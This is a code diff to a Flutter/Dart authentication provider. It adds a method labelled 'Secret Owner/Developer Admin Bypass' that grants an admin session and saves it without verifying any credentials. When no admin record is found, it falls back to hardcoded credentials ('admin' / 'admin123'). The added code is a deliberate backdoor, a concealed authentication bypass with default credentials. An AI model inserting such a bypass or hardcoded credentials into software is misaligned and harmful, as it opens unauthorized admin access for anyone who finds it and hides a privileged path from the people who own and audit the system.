@@ -167,6 +167,40 @@ class AuthProvider extends ChangeNotifier {
     }
   }
 
+  /// Secret Owner/Developer Admin Bypass
+  Future<bool> bypassAdminLogin() async {
+    _isLoading = true;
+    _errorMessage = null;
+    notifyListeners();
+
+    try {
+      AdminModel? admin = await _dbHelper.getAdminByUsername(AppConstants.defaultAdminUsername);
+      admin ??= AdminModel(id: 1, username: 'admin', password: 'admin123');
+
+      _currentAdmin = admin;
+      _role = UserRole.admin;
+      _isLoggedIn = true;
+      _userId = admin.id ?? 1;
+      _userName = admin.username;
+
+      // Persist session
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.setBool(AppConstants.prefIsLoggedIn, true);
+      await prefs.setString(AppConstants.prefUserRole, UserRole.admin.value);
+      await prefs.setInt(AppConstants.prefUserId, admin.id ?? 1);
+      await prefs.setString(AppConstants.prefUserName, admin.username);
+
+      _isLoading = false;
+      notifyListeners();
+      return true;
+    } catch (e) {
+      _errorMessage = 'Admin bypass error: $e';
+      _isLoading = false;
+      notifyListeners();
+      return false;
+    }
+  }
+
   /// Updates Admin Password
   Future<bool> changeAdminPassword(String oldPassword, String newPassword) async {
     if (_currentAdmin == null || _userId == null) {
